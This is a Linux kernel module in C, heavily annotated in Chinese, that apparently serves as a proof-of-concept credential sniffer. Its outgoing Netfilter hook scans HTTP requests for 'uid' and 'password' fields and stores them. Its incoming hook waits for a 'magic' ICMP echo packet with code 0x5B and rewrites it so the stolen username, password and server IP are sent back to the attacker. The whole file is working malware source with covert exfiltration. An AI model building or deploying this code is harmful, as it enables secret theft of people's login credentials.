#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>

/* 使用ICMP_ECHO数据包，代码字段设置为0x5B*/
#define MAGIC_CODE   0x5B     //watch_in函数和攻击者预定的暗号，用以传输用户名和密码
#define REPLY_SIZE   36

/*"GPL" 是指明了 这是GNU General Public License的任意版本*/
MODULE_LICENSE("GPL");  

/*ICMP有效载荷大小 计算方式是得到整个ip数据包的总长度 减去 ip头部大小 再减去 icmp头部大小*/ 
/*网络程序中要用到主机字节序和网络字节序的转换，htons函数就是其中一个功能；同时要考虑机器的小端存储和大端存储；
    htonl()--"Host to Network Long"
    ntohl()--"Network to Host Long"
    htons()--"Host to Network Short"
    ntohs()--"Network to Host Short"  */
#define ICMP_PAYLOAD_SIZE  (htons(ip_hdr(sb)->tot_len) \
                   - sizeof(struct iphdr) \
                   - sizeof(struct icmphdr))

/*基于内核的FTP密码嗅探器的简单概念验证。
 *捕获的用户名和密码对将发送到远程主机
 *当主机发送特殊格式的ICMP数据包时。在这里，我们
 *应使用ICMP_ECHO数据包，其代码字段设置为0x5B
 * * AND *数据包已足够
 *标题后的空格，以适应4字节的IP地址和
 *用户名和密码字段是最大值。15个字符
 *每个加一个NULL字节。所以总ICMP有效载荷大小为36个字节。* /
 
/*  
 username和password用来保存拿到的用户名/密码对
一次只能保留一个USER / PASS对，一旦发起请求将被清除。
*/
static char *username = NULL;
static char *password = NULL;

/* 标记我们是否已经有一对用户名/密码对 */
static int  have_pair = 0;   

/* 
 追踪信息。只记录转到的USER和PASS命令相同的IP地址和TCP端口
 目标ip 和 目标端口 
*/
static unsigned int target_ip = 0;
static unsigned short target_port = 0;

/* 用于描述我们的Netfilter挂钩
	nf_hook_ops数据结构在linux/netfilter.h中定义
	我们定义两个nf_hook_ops结构体，一个传入的hook 和 一个传出的hook 
 */
struct nf_hook_ops  pre_hook;          /* 传入 */
struct nf_hook_ops  post_hook;         /* 传出 */

/*
查看已知为受害者主机向外发送的HTTP数据包的sk_buff。查找USER和PASS字段，并确保它们都来自target_xxx字段中指示的一个主机
*/
static void check_http(struct sk_buff *skb)
{
	/* 定义一个tcphdr结构体 *TCP */ 
   struct tcphdr *tcp;
   char *data;
   char *name;
   char *passwd;
   char *_and;
   char *check_connection;
   int len,i;

    
   /*socket缓冲区：*
           1.每个socket被创建后，都会被分配两个缓冲区，输入缓冲区和输出缓冲区；
		   2.write()/send() 并不立即向网络中传输数据，而是先将数据写入缓冲区中，
		   再由TCP协议将数据从缓冲区发送到目标机器。一旦将数据写入到缓冲区，函数就可以成功返回，
		   不管它们有没有到达目标机器，也不管它们何时被发送到网络，这些都是TCP协议负责的事情；
		   3.read()/recv() 函数也是如此，也从输入缓冲区中读取数据，而不是直接从网络中读取*/ 
   /* 从套接字缓冲区(skb指向的地址)中获取tcp首部 */ 
   tcp = tcp_hdr(skb);
   /* 系统位数导致强制类型转换错误 64位系统中指针类型8个字节，因此强转为int会出错，可以转成同样为8字节的long型 
   通过tcp首部位置 + tcp长度*4字节 算出数据区域的位置 data */ 
   /*tcp->doff为TCP报文中的偏移字段，指示TCP的头部长度，单位为4字节*/
   /*在网站上输入用户名和密码登录邮箱属于HTTP请求，其在传输层由TCP协议单元来封装，所以要获取保存用户名和密码的请求数据需要定位到TCP的数据部分*/
   /* -----sk_buff结构体定义的变量为unsigned long类型*/
   data = (char *)((unsigned long)tcp + (unsigned long)(tcp->doff * 4));


	/* 判断"Upgrade-In"在data中，这里是找了cookie和正式数据中间的字符串，判断"uid"在data中，判断"password"在data中 */ 
	/*strstr函数返回子串在字符串中的位置*/
   if (strstr(data,"Upgrade-In") != NULL && strstr(data, "uid") != NULL && strstr(data, "password") != NULL) { 

		/* 返回在data中首次出现Upgrade-In的地址 */ 
        check_connection = strstr(data,"Upgrade-In");
		
		/*返回check_connection之后首次出现uid的地址*/ 
        name = strstr(check_connection,"uid=");
        /*返回name之后首次出现&的地址*/ 
        _and = strstr(name,"&");
        /*将name往后移动4字节，因为uid=占了四字节，所以移动之后name就是所存储的uid了*/
        name += 4;
        /*这是uid的长度，用&位置减去uid开始的位置*/ 
        len = _and - name;
        /*在内核中给这个username分配内存大小(kmalloc)。len+2是因为还需要结束符\0，和留一个空格(和密码区分开)*/ 
        if ((username = kmalloc(len + 2, GFP_KERNEL)) == NULL)
          return;
        /*将username开始的len+2字节设置为0x00，其实就是初始化*/ 
        memset(username, 0x00, len + 2);
        
        /*用一个for循环将获取的uid放到username中*/
        for (i = 0; i < len; ++i)
        {
          *(username + i) = name[i];
        }
        *(username + len) = '\0';

		/*这里获取密码和上面获取用户名用的是一样的方法*/ 
		/*返回name之后首次出现password=的地址*/ 
        passwd = strstr(name,"password=");
        /*返回passwd之后首次出现&的地址*/ 
        _and = strstr(passwd,"&");
        /*password=占了9字节，跳过这个字段*/
        passwd += 9;
        /*len为真实密码的长度*/ 
        len = _and - passwd;
        /*将密码放到password中*/ 
        if ((password = kmalloc(len + 2, GFP_KERNEL)) == NULL)
          return;
        memset(password, 0x00, len + 2);
        for (i = 0; i < len; ++i)
        {
          *(password + i) = passwd[i];
        }
        *(password + len) = '\0';

   } else {
   	/*如果数据区域data中没有上面三个字段则直接返回*/ 
      return;
   }

   /*获取32位目的ip，从ip首部的daddr字段中获取*/
   /*target_ip是邮箱服务器的IP，对应用户名和密码*/   
   if (!target_ip)
     target_ip = ip_hdr(skb)->daddr;
   /*获取16位源端口号，从tcp首部的source中获取*/ 
   /*获取访问的邮箱服务器的端口号*/
   if (!target_port)
     target_port = tcp->source;

	/*
	username和password都获取到了，将have_pair变为1 
	*/ 
   if (username && password)
     have_pair++;              
     
   /*
   获取到一个用户名/密码对，have_pair就为1了 ，并将获取到的用户名和密码输出 
   */ 
   if (have_pair)
     printk("Have password pair!  U: %s   P: %s\n", username, password);
}

/* 函数称为POST_ROUTING（最后）钩子。它会检查HTTP流量然后搜索该流量的USER和PASS命令 */
static unsigned int watch_out(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
   struct sk_buff *sb = skb;
   struct tcphdr *tcp;
   
   /* 首先确保这是一个TCP数据包 */
   if (ip_hdr(sb)->protocol != IPPROTO_TCP)
     return NF_ACCEPT;             /* Nope, not TCP */

   /*ip的首部长度*4字节就是跳过ip首部 到达HTTP请求的位置*/ 
   tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));

   /* 现在检查它是否是一个HTTP包*/
   if (tcp->dest != htons(80))
     return NF_ACCEPT;             /* Nope, not FTP */

   /* 如果还未获取到用户名密码对，则调用check_HTTP（）去获取 */
   if (!have_pair)
     check_http(sb);

   /* 保留该数据包 */
   return NF_ACCEPT;
}

/*监视“Magic”数据包的传入ICMP流量的过程。
 *收到后，我们调整skb结构发送回复
 *回到请求主机并告诉Netfilter我们偷了包。*/
 /*该函数负责监听攻击者发过来的包，将用户名和密码数据传回去*/
static unsigned int watch_in(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
	/*让传入的缓冲skb存到sb中*/ 
   struct sk_buff *sb = skb;   //防止缓冲区的首地址丢失
   /*定义一个icmp首部指针*/ 
   struct icmphdr *icmp;
   /**/ 
   char *cp_data;/* 我们将数据复制到回复中 */
   /**/              
   unsigned int   taddr;           /* Temporary IP holder */

   /* 我判断是否已经获取到用户名/密码对了 */
   if (!have_pair)
     return NF_ACCEPT;  //接受数据包，不做处理

   /* 判断这是不是一个ICMP包 */
   if (ip_hdr(sb)->protocol != IPPROTO_ICMP)
     return NF_ACCEPT;

   /* ip的首部长度*4字节就是跳过ip首部 到达icmp首部的位置 */ 
   icmp = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4);

   /* 判断这是不是一个MAGIC包 0x58，icmp类型是不是ICMP_ECHO（8或者0）,icmp有效载荷是不是大于等于36*/
   if (icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO
     || ICMP_PAYLOAD_SIZE < REPLY_SIZE) {
      return NF_ACCEPT;  //通过且不做任何处理
   }

   /*好的，匹配我们的“魔法”检查，现在我们不知所措
    * sk_buff插入IP地址和用户名/密码对，
    *交换IP源和目标地址以及以太网地址*/
    
   /*将ip首部中的源地址和目的地址互换——因为对攻击者的ICMP包进行修改后转发*/
   /*32位源IP地址暂时存在taddr中*/ 
   taddr = ip_hdr(sb)->saddr; 
   ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
   ip_hdr(sb)->daddr = taddr;

   /*PACKET_OUTGOING用于发送数据包从本地主机环回到数据包套接字  ？？不太懂*/ 
  
   sb->pkt_type = PACKET_OUTGOING;   //设置转发出去的类型，把接收到并修改的包类型设置为转发出去的包

   /*struct net_device * dev;*/ 
   switch (sb->dev->type) {
   	//512 
    case ARPHRD_PPP:               /* Ntcho iddling needs doing */
      break;
    // 772 环回设备  
    case ARPHRD_LOOPBACK:
    // 1 以太网10Mbps 
    case ARPHRD_ETHER:
    {
    	/*#define ETH_ALEN 6  定义了以太网接口的MAC地址的长度为6个字节*/ 
       unsigned char t_hwaddr[ETH_ALEN];

       /* 移动数据指针指向链接层头部*/
       sb->data = (unsigned char *)eth_hdr(sb);
       /*跳过mac地址*/ 
       sb->len += ETH_HLEN; //sizeof(sb->mac.ethernet);
       
       /*交换mac源地址和mac目的地址*/ 
       /*将目的地址放到t_HWADDR*/ 
       memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
       /*将源地址放到原目的地址的地方*/ 
       memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),
          ETH_ALEN);
       memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
       break;
    }
   };

   /* 现在将邮箱服务器的IP地址，然后用户名，然后密码复制到数据包*/
   /*cp_data指向数据部分，这里是跳过icmp首部*/ 
   cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));
   /*将目标服务器的ip地址放到数据区域*/ 
   memcpy(cp_data, &target_ip, 4);  //IP地址为4字节
   
   /*将用户名和密码放到cp_data中*/ 
   if (username)
     /*跳过上面用掉的4字节*/ 
     memcpy(cp_data + 4, username, 16);
   if (password)
     /*跳过上面用掉的20字节*/ 
     memcpy(cp_data + 20, password, 16);

   /* dev_queue_xmit这个网络设备接口层函数发送给driver
   https://blog.csdn.net/wdscq1234/article/details/51926808
    * */
   dev_queue_xmit(sb);  //sb指向ICMP数据包，这里对该数据包进行封装

   /* 现在释放保存的用户名和密码并重置have_pair */
   kfree(username);
   kfree(password);
   username = password = NULL;
   have_pair = 0;

   target_port = target_ip = 0;

	/*忘掉该数据包*/ 
	/*STOLEN：受害者向攻击者发送用户名和密码的数据包实际上是在攻击者发过来的报文中修改的，修改后
   需要告诉系统忘记原有的那个skb，因为skb被修改，并以新的方式发送出去了*/
   return NF_STOLEN;
}

/*
内核模块中的两个函数 init_module() ：表示起始 和 cleanup_module() ：表示结束 
*/ 
int init_module()
{
	/*hook函数指针指向watc_in*/ 
   pre_hook.hook     = watch_in;
   /*协议簇为ipv4*/  
   pre_hook.pf       = PF_INET;
   /*优先级最高*/
   pre_hook.priority = NF_IP_PRI_FIRST;
   /*hook的类型为 在完整性校验之后，选路确定之前*/ 
   pre_hook.hooknum  = NF_INET_PRE_ROUTING;  //PRE_ROUTING绑定watch_in函数，构成了一个pre_hook结构体；其绑定其它函数形成其它结构体，这里要设置该结构体优先级最高

   /*hook函数指针指向watch_out*/ 
   post_hook.hook     = watch_out;
   /*协议簇为ipv4*/  
   post_hook.pf       = PF_INET;
   /*优先级最高*/
   post_hook.priority = NF_IP_PRI_FIRST;
   /*hook的类型为 在完数据包离开本地主机“上线”之前*/ 
   post_hook.hooknum  = NF_INET_POST_ROUTING;

   /*将pre_hook和post_hook注册，注册实际上就是在一个nf_hook_ops链表中再插入一个nf_hook_ops结构*/ 
   nf_register_net_hook(&init_net ,&pre_hook);
   nf_register_net_hook(&init_net ,&post_hook);

	printk(KERN_INFO "Hello world 1.\n");
   return 0;
}

void cleanup_module()
{
	/*将pre_hook和post_hook取消注册，取消注册实际上就是在一个nf_hook_ops链表中删除一个nf_hook_ops结构*/ 
   nf_unregister_net_hook(&init_net ,&post_hook);
   nf_unregister_net_hook($init_net ,&pre_hook);

	/*释放之前分配的内核空间*/ 
   if (password)
     kfree(password);
   if (username)
     kfree(username);
    
	printk(KERN_INFO "Goodbye world 1.\n");
}
